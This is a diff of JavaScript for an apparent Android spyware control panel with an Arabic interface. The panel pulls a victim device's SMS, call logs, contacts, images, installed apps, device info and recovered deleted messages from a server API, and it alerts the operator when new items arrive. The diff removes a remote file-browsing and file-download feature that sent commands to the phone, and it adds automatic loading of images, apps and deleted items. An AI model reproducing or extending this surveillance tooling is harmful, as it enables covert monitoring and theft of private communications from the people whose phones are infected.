@@ -9,7 +9,6 @@ let allCalls = [];
 let allSMS = [];
 let allContacts = [];
 let allDeleted = [];
-let allFiles = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
@@ -19,7 +18,6 @@ let lastSmsCount = 0;
 let lastDeletedCount = 0;
 let notificationShown = false;
 let soundPlayedForDevice = false;
-let currentFilePath = "/storage/emulated/0";
 
 function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
 function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
@@ -52,7 +50,10 @@ function checkNewSMS(newSMS) {
         const s = newSMS[0];
         showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
         const badge = document.getElementById('smsCount');
-        if (badge) { badge.textContent = `(${newSMS.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${newSMS.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastSmsCount = newSMS.length;
 }
@@ -63,7 +64,10 @@ function checkNewCalls(newCalls) {
         const c = newCalls[0];
         showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
         const badge = document.getElementById('callCount');
-        if (badge) { badge.textContent = `(${newCalls.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${newCalls.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastCallCount = newCalls.length;
 }
@@ -75,7 +79,10 @@ function checkNewDeleted(deleted) {
         const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
         showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
         const badge = document.getElementById('deletedCount');
-        if (badge) { badge.textContent = `(${deleted.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${deleted.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastDeletedCount = deleted.length;
 }
@@ -94,14 +101,11 @@ async function deleteDevice() {
             document.getElementById('deviceSelect').value = '';
             document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
             document.getElementById('deviceNameDisplay').className = 'device-name-display';
-            
-            setTimeout(() => { loadDevices(); }, 500);
-            setTimeout(() => { loadDevices(); }, 1500);
-            setTimeout(() => { loadDevices(); }, 3000);
-            setTimeout(() => { loadDevices(); }, 5000);
-            setTimeout(() => { loadDevices(); }, 8000);
+            loadDevices();
+        } else {
+            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
         }
-    } catch (e) { alert('❌ خطأ: ' + e.message); }
+    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
 }
 
 async function loadDevices() {
@@ -174,7 +178,6 @@ async function updateLiveData() {
         if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
         if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
-        if (data.files_count !== undefined) document.getElementById('filesCount').textContent = `(${data.files_count})`;
     } catch (e) {}
 }
 
@@ -183,212 +186,18 @@ async function loadAllData() {
     await loadCalls();
     await loadSMS();
     await loadContacts();
+    await loadImages();
+    await loadApps();
     await loadDeviceInfo();
+    await loadDeleted();
 }
 
-// ✅ التعديل — بدون loadFiles
-function switchTab(tabName) {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
-    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
-    if (tab) tab.classList.add('active');
-    const pane = document.getElementById(`${tabName}Tab`);
-    if (pane) pane.classList.add('active');
-    
-    if (tabName === 'images') loadImages();
-    if (tabName === 'deleted') loadDeleted();
-    if (tabName === 'files') { loadFileList(currentFilePath); }
-    if (tabName === 'apps') loadApps();
-    if (tabName === 'device') loadDeviceInfo();
-    if (tabName === 'contacts') loadContacts();
-}
-
-// ============ مدير الملفات ============
-
-async function loadFileList(path) {
-    const div = document.getElementById('filesList');
-    if (div) div.innerHTML = '<p style="color:#00ffcc;">⏳ جاري القراءة...</p>';
-    
-    const requestedPath = path;
-    document.getElementById('currentPath').value = path;
-    
-    await fetch('/api.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ device: currentDevice, command: `list_files:${path}` })
-    });
-    
-    let attempts = 0;
-    const checkInterval = setInterval(async () => {
-        attempts++;
-        const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
-        const data = await response.json();
-        
-        if (data.files && data.files.length > 0) {
-            clearInterval(checkInterval);
-            currentFilePath = requestedPath;
-            displayFileList(data.files);
-        } else if (attempts >= 5) {
-            clearInterval(checkInterval);
-            div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
-        }
-    }, 3000);
-}
-
-function displayFileList(files) {
-    const div = document.getElementById('filesList');
-    if (!div) return;
-    div.innerHTML = '';
-    
-    if (!files || files.length === 0) {
-        div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
-        return;
-    }
-    
-    files.forEach(file => {
-        const item = document.createElement('div');
-        item.className = 'conversation-item';
-        
-        if (file.is_directory) {
-            item.innerHTML = `
-                <div class="conversation-avatar">📁</div>
-                <div class="conversation-info">
-                    <div class="conversation-name">${file.name}</div>
-                    <div class="conversation-preview">مجلد</div>
-                </div>
-                <div class="conversation-time">${formatDate(file.last_modified)}</div>
-            `;
-            item.onclick = () => loadFileList(file.path);
-        } else {
-            item.innerHTML = `
-                <div class="conversation-avatar">📄</div>
-                <div class="conversation-info">
-                    <div class="conversation-name">${file.name}</div>
-                    <div class="conversation-preview">${formatBytes(file.size)}</div>
-                </div>
-                <div class="file-actions">
-                    <button class="action-btn" onclick="downloadPhoneFile('${file.path}')">⬇️ تحميل</button>
-                </div>
-            `;
-        }
-        
-        div.appendChild(item);
-    });
-}
-
-async function downloadPhoneFile(path) {
-    const btn = event.target;
-    btn.textContent = '⏳';
-    btn.disabled = true;
-    
-    let oldCount = 0;
-    try {
-        const oldResponse = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
-        const oldFiles = await oldResponse.json();
-        oldCount = oldFiles.length || 0;
-    } catch (e) {}
-    
-    await fetch('/api.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
-    });
-    
-    let attempts = 0;
-    const checkInterval = setInterval(async () => {
-        attempts++;
-        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
-        const files = await response.json();
-        
-        if (files && files.length > oldCount) {
-            clearInterval(checkInterval);
-            btn.textContent = '✅ تم';
-            btn.disabled = false;
-            loadFiles();
-        } else if (attempts >= 10) {
-            clearInterval(checkInterval);
-            btn.textContent = '⬇️ تحميل';
-            btn.disabled = false;
-        }
-    }, 3000);
-}
-
-function navigateUp() {
-    const parts = currentFilePath.split('/');
-    parts.pop();
-    const parentPath = parts.join('/') || '/';
-    loadFileList(parentPath);
-}
-
-// ============ الملفات المحملة ============
-
-async function loadFiles() {
-    try {
-        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
-        const files = await response.json();
-        
-        const div = document.getElementById('filesList');
-        if (!div) return;
-        
-        if (files && files.length > 0) {
-            div.innerHTML = '<h4 style="color:#00ffcc;margin-bottom:10px;">📥 الملفات المحملة:</h4>';
-            
-            [...files].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(file => {
-                const divItem = document.createElement('div');
-                divItem.className = 'conversation-item';
-                
-                let icon = '📄';
-                if (file.name) {
-                    const ext = file.name.toLowerCase().split('.').pop();
-                    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) icon = '🖼️';
-                    else if (['mp4', 'avi', 'mkv', 'mov'].includes(ext)) icon = '🎬';
-                    else if (['mp3', 'wav', 'ogg'].includes(ext)) icon = '🎵';
-                }
-                
-                divItem.innerHTML = `
-                    <div class="conversation-avatar">${icon}</div>
-                    <div class="conversation-info">
-                        <div class="conversation-name">${file.name || 'ملف'}</div>
-                        <div class="conversation-preview">${formatBytes(file.size)}</div>
-                    </div>
-                    <div class="file-actions">
-                        <button class="action-btn" onclick="viewDownloadedFile('${file.name}')">👁️ عرض</button>
-                    </div>
-                `;
-                div.appendChild(divItem);
-            });
-        }
-    } catch (e) {}
-}
-
-async function viewDownloadedFile(name) {
-    try {
-        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
-        const files = await response.json();
-        const file = files.find(f => f.name === name);
-        
-        if (!file || !file.data) { alert('❌ لا توجد بيانات'); return; }
-        
-        let mimeType = 'application/octet-stream';
-        const ext = name.toLowerCase().split('.').pop();
-        if (['jpg', 'jpeg'].includes(ext)) mimeType = 'image/jpeg';
-        else if (ext === 'png') mimeType = 'image/png';
-        else if (ext === 'gif') mimeType = 'image/gif';
-        else if (ext === 'mp4') mimeType = 'video/mp4';
-        else if (ext === 'mp3') mimeType = 'audio/mpeg';
-        else if (ext === 'pdf') mimeType = 'application/pdf';
-        else if (ext === 'txt') mimeType = 'text/plain';
-        
-        window.open(`data:${mimeType};base64,${file.data}`, '_blank');
-    } catch (e) { alert('❌ خطأ في العرض'); }
-}
-
-// ============ باقي الدوال ============
-
+// ✅ تحميل المحذوفات
 async function loadDeleted() {
     try {
         const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
         const deleted = await response.json();
+        
         if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
             checkNewDeleted(deleted);
             allDeleted = deleted;
@@ -397,9 +206,11 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
+// ✅ عرض المحذوفات مع التفاصيل الكاملة
 function displayDeleted() {
     const div = document.getElementById('deletedList');
     if (!div) return;
+    
     div.innerHTML = '';
     
     if (!allDeleted || allDeleted.length === 0) {
@@ -626,9 +437,17 @@ async function loadDeviceInfo() {
     } catch (e) {}
 }
 
+function switchTab(tabName) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
+    if (tab) tab.classList.add('active');
+    const pane = document.getElementById(`${tabName}Tab`);
+    if (pane) pane.classList.add('active');
+}
+
 function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
 function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
-function formatBytes(bytes) { if (!bytes || bytes === 0) return '0 Bytes'; const k = 1024; const sizes = ['Bytes', 'KB', 'MB', 'GB']; const i = Math.floor(Math.log(bytes) / Math.log(k)); return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]; }
 function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }
 
 loadDevices();
